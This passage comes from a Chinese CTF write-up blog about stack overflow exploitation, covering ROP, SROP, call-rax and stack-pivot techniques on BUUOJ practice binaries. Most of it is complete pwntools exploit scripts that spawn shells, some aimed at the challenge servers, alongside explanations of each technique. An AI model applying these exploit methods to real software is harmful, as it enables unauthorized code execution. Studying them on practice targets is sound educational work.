class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">pa.sendline(p)</span><br><span class="line"></span><br><span class="line">pa.interactive()</span><br></pre></td></tr></table></figure>







<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="_ciscn_2019_s_3"></a>_ciscn_2019_s_3</h2><p>main里只有一个vuln函数<br>直接进去看</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202170418.png" alt="205415324135211"></p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202171801.png" alt="202"></p>
<p>看汇编分析：</p>
<p>需要在栈上构造/bin/sh，并且需要rax=59让64位的syscall执行execve才能getshell</p>
<p>64 位：系统调用号放入 rax，参数依次放到 rdi、rsi、rdx，返回值放在 rax</p>
<p>64位程序前六个寄存器调用顺序：rdi rsi rdx rcx r8 r9</p>
<p>寄存器大概布局：<br>rax = 59<br>rdi = /bin/sh<br>rsi = 0<br>rdx = 0</p>
<p>注意到vuln函数末尾并没有使用leave指令，即直接把之前push的rbp当作return address<br>我们要ROP的话offset只需要0x10</p>
<p>先构造/bin/sh在栈中</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211800.png" alt="20201202211800"></p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211855.png" alt="20201202211855"></p>
<p>发现/bin/sh已经在栈中了，在打印到0x20的时候，接下来是打印出来一个地址，这也是为什么需要recv的原因，这个地址是栈上面的，所以只要算出这个地址和/bin/sh地址的相对偏移，就可以在程序每次执行的时候算出binsh的地址了，因为地址会变，但是偏移不会</p>
<p>我们输出了地址stack_addr</p>
<p>计算偏移量 0x7ffdc7824d78 - 0x007FFDC7824C60 = 0x118</p>
<p>所以计算binsh_addr = stack_addr - 0x118</p>
<p>构造完/bin/sh之后，在程序中有给我们一个gadgets函数：</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201203155951.png" alt="20201203155951"></p>
<p>只要我们跳到地址0x4004E2就能把3Bh（59）赋值给rax，这样系统调用号的参数也搞定了</p>
<p>接下来可以利用csu把 rsi = 0，rdx = 0 ，最后用pop rdi ; ret存上/bin/sh就万事大吉了</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20201203161803.png" alt="20201203161803"></p>
<p>需要注意的是call这个地方call的是r12地址上的内容，我们这里要call的是mov rax,3Bh ，而mov rax,3Bh可以存在/bin/sh\x00aaaaaaaa(一共长0x10)后面，所以r12 = binsh_addr + 0x10</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27933</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr = <span class="number">0x0004004ED</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x118</span></span><br><span class="line">pop_rbx_rbp_r12_r13_14_r15 = <span class="number">0x40059A</span></span><br><span class="line">mov_rdx_r13 = <span class="number">0x400580</span></span><br><span class="line">mov_rax_59 = <span class="number">0x4004E2</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span> + p64(mov_rax_59) </span><br><span class="line">payload += p64(pop_rbx_rbp_r12_r13_14_r15) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(binsh_addr+<span class="number">0x10</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(mov_rdx_r13) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">6</span>*<span class="number">8</span>+<span class="number">8</span>) </span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr) + p64(syscall_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><a href="https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/edumds">参考链接</a></p>
<h2 id="SROP-1"><a href="#SROP-1" class="headerlink" title="SROP"></a>SROP</h2><p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.binary=(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">sigret=<span class="number">0x4004DA</span></span><br><span class="line">sys=<span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(pl1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(p.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip= sys</span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">pl2=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sigret)+p64(sys)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(pl2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/github_36788573/article/details/103541178">参考链接</a></p>
<h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h2><p>ida</p>
<p><img src="/article/Stack%20Overflow/image-20211009212737739.png" alt="image-20211009212737739"></p>
<p>看到系统调用、mov rax,15 和溢出，想到SROP</p>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p><img src="/article/Stack%20Overflow/image-20211009213732309.png" alt="image-20211009213732309"></p>
<p>就是在内核返回到用户时（sigreturn），会把原来的context（保存在栈里的Signal Frame）给复原，而Signal Frame在用户栈里，那么用户就是拥有读写权限的，里面存有rip等寄存器，所以我们刻意触发sigreturn，然后伪造Signal Frame，进而控制程序。</p>
<h3 id="Signal-Frame"><a href="#Signal-Frame" class="headerlink" title="Signal Frame"></a>Signal Frame</h3><p><img src="/article/Stack%20Overflow/image-20211009214543868.png" alt="image-20211009214543868"></p>
<p>在这个伪造的<code>Signal Frame</code>中，将<code>rax</code>设置成<code>59</code>（即<code>execve</code>系统调用号），将<code>rdi</code>设置成字符串<code>/bin/sh</code>的地址（该字符串可以是攻击者写在栈上的），将<code>rip</code>设置成系统调用指令<code>syscall</code>的内存地址，最后，将<code>rt_sigreturn</code>手动设置成<code>sigreturn</code>系统调用的内存地址（系统调用号为 <code>15</code> 的 <code>syscall</code>）。那么，当这个伪造的<code>sigreturn</code>系统调用返回之后，相应的寄存器就被设置成了攻击者可以控制的值，在这个例子中，一旦<code>sigreturn</code>返回，就会去执行<code>execve</code>系统调用，打开一个<code>shell</code></p>
<h3 id="解题条件"><a href="#解题条件" class="headerlink" title="解题条件"></a>解题条件</h3><ul>
<li>字符串 <code>/bin/sh</code> 的地址</li>
<li><code>syscall</code>的地址</li>
<li><code>sigretn</code>的地址</li>
</ul>
<h3 id="找到-bin-sh-的地址"><a href="#找到-bin-sh-的地址" class="headerlink" title="找到 /bin/sh 的地址"></a>找到 /bin/sh 的地址</h3><p>程序输入0x10个字节，输出0x30个字节</p>
<p><img src="/article/Stack%20Overflow/image-20211010150342361.png" alt="image-20211010150342361"></p>
<p>在多余的输出内容当中可以看见一个内存的地址，利用它可以计算与我们输入的字符串<code>/bin/sh</code>之间的偏移</p>
<p><img src="/article/Stack%20Overflow/image-20211010150719981.png" alt="image-20211010150719981"></p>
<p>偏移<code>0x118</code></p>
<h3 id="找到-syscall-的地址"><a href="#找到-syscall-的地址" class="headerlink" title="找到 syscall 的地址"></a>找到 syscall 的地址</h3><p><img src="/article/Stack%20Overflow/image-20211010150832725.png" alt="image-20211010150832725"></p>
<h3 id="找到-sigretn-的地址"><a href="#找到-sigretn-的地址" class="headerlink" title="找到 sigretn 的地址"></a>找到 sigretn 的地址</h3><p><img src="/article/Stack%20Overflow/image-20211010150917285.png" alt="image-20211010150917285"></p>
<p>execve的系统调用号也有</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 process</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./ciscn_2019_es_7&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26148</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_es_7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">syscall_ret = <span class="number">0x400517</span></span><br><span class="line">sigreturn_addr = <span class="number">0x4004da</span> <span class="comment"># mov rax,15 ; retn</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>) + p64(vuln_addr)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr - <span class="number">0x118</span>  <span class="comment"># /bin/sh</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>) + p64(sigreturn_addr) + p64(syscall_ret) + <span class="built_in">str</span>(sigframe)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="Call-rax"><a href="#Call-rax" class="headerlink" title="Call rax"></a>Call rax</h1><p>栈逆向</p>
<h2 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h2><p>保护</p>
<p><img src="/article/Stack%20Overflow/image-20210422161136059.png" alt="image-20210422161136059"></p>
<p>IDA</p>
<p><img src="/article/Stack%20Overflow/image-20210422161155938.png" alt="image-20210422161155938"></p>
<p>给了admin和密码</p>
<p>运行一下</p>
<p><img src="/article/Stack%20Overflow/image-20210422161355739.png" alt="image-20210422161355739"></p>
<p>看一下 password_checker 的汇编，发现call rax，很异或，逆向一下</p>
<p><img src="/article/Stack%20Overflow/image-20210422161518133.png" alt="image-20210422161518133"></p>
<p>回到main函数汇编</p>
<p><img src="/article/Stack%20Overflow/image-20210422161844047.png" alt="image-20210422161844047"></p>
<p><img src="/article/Stack%20Overflow/image-20210422161927745.png" alt="image-20210422161927745"></p>
<p>在 read_password 里找到var_18</p>
<p><img src="/article/Stack%20Overflow/image-20210422162137124.png" alt="image-20210422162137124"></p>
<p>0x60 - 0x18 = 0x48<br>0x48 - 14 = 58</p>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26218</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./login&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;2jctf_pa5sw0rd&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">58</span> + p64(<span class="number">0x000000000400E88</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please enter username: &#x27;</span>,<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please enter password: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><h2 id="leave-retn"><a href="#leave-retn" class="headerlink" title="leave; retn"></a>leave; retn</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure>

<p>构造 payload 的时候把 target_addr 放在 ebp 的位置上，leave ; rent 放在返回地址上。</p>
<p>执行 pop ebp 后，ebp就指向了 target_addr，并且 esp 减一个单位，esp 指向 返回地址。</p>
<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="_ciscn_2019_es_2"></a>_ciscn_2019_es_2</h2><p>第一步：是把一个与ebp有关的地址泄漏出来，可以通过栈的填充做到</p>
<p>第二步：找到一个ebp与泄漏地址的偏移距离</p>
<p>第三步：构造fake_stack</p>
<p>fake_stack：</p>
<p><img src="/article/Stack%20Overflow/1592217825493-a03b7b13-c3d9-4411-b7af-ddaaa2a27a7f.png" alt="1592217825493-a03b7b13-c3d9-4411-b7af-ddaaa2a27a7f"></p>
<p>偏移距离：</p>
<p>break在printf处</p>
<p><img src="/article/Stack%20Overflow/20201208200613.png" alt="20201208200613"></p>
<p>距离为0x10</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25520</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_es_2&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sys_addr = <span class="number">0x08048400</span></span><br><span class="line">leave_ret = <span class="number">0x080485FD</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">payload1 = (<span class="string">&#x27;aaaa&#x27;</span> + p32(sys_addr) + <span class="string">&#x27;bbbb&#x27;</span> + p32(ebp-<span class="number">0x28</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload1 += p32(ebp-<span class="number">0x28</span>-<span class="number">0x10</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="buu-spwn"><a href="#buu-spwn" class="headerlink" title="buu_spwn"></a>buu_spwn</h2><p>32bit程序</p>
<p>看ida</p>
<p><img src="/article/Stack%20Overflow/20201206182837.png" alt="20201206182837"></p>
<p>汇编中发现 leave retn</p>
<p><img src="/article/Stack%20Overflow/20201206183042.png" alt="20201206183042"></p>
<p>leave retn：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave &#x3D;&#x3D;&gt; mov esp, ebp;  pop ebp;</span><br><span class="line">retn  &#x3D;&#x3D;&gt; pop eip</span><br></pre></td></tr></table></figure>

<p>其中pop eip相当于将栈顶数据给eip，由于ret返回的是栈顶数据，而栈顶地址是由esp的值决定的，esp的值，从leave可以得出是由ebp决定的。所以我们可以通过覆盖ebp的值来控制ret返回地址。两次leave ret即可控制esp为我们想要的地址。由于有pop ebp，会使esp-4（64位-8），将ebp 覆盖为想要调整的位置-4（64位-8）即可</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26070</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./spwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">bss_addr=<span class="number">0x0804A300</span></span><br><span class="line">leave_ret=<span class="number">0x08048511</span></span><br><span class="line"></span><br><span class="line">payload=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload=p32(sys_addr)+<span class="string">&#x27;aaaa&#x27;</span>+p32(bin_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h2><p>IDA</p>
<p><img src="/article/Stack%20Overflow/image-20210531154533324.png" alt="image-20210531154533324"></p>
<p>仅溢出0x10字节，无法构造ROP。</p>
<p>程序还给了bss段，可读写</p>
<p><img src="/article/Stack%20Overflow/image-20210531154745045.png" alt="image-20210531154745045"></p>
<h3 id="构造-fake-stack"><a href="#构造-fake-stack" class="headerlink" title="构造 fake stack"></a>构造 fake stack</h3><p><img src="/article/Stack%20Overflow/image-20210531160601177.png" alt="image-20210531160601177"></p>
<p>程序中bss段与它上方的got表字段比较近，当rop段返回到main函数的时候会 sub  rsp, 60h ，有可能会覆盖掉 got 表导致程序报错，所以需要填充字段</p>
<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29811</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946 12345</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)</span><br><span class="line"></span><br><span 